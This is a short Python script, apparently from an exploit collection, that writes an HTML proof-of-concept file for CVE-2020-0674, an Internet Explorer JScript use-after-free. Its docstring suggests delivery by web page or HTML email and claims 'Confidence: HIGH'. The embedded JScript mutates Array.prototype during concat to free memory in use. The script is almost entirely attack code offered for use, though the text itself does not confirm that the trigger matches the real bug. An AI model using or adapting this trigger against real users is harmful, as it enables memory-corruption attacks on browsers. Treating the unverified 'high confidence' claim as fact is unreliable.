#!/usr/bin/env python3
"""CVE-2020-0674 — Internet Explorer JScript use-after-free. Zero-click-ish:
open a page / HTML email. Public PoC. Confidence: HIGH."""
import sys
from pathlib import Path

HTML = b"""<html><body>
<script language="JScript">
// UAF via Array.concat + prototype mutation
var a = [1,2,3];
Object.defineProperty(Array.prototype, '0', {get: function(){ a.length = 0; return 1; }});
var b = a.concat([4,5,6]);
document.title = 'jscript-' + b.length;
</script></body></html>"""

def build() -> bytes: return HTML

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-0674.html")
    out.write_bytes(build()); print(f"[+] CVE-2020-0674 HTML -> {out}")

if __name__ == "__main__":
    main()
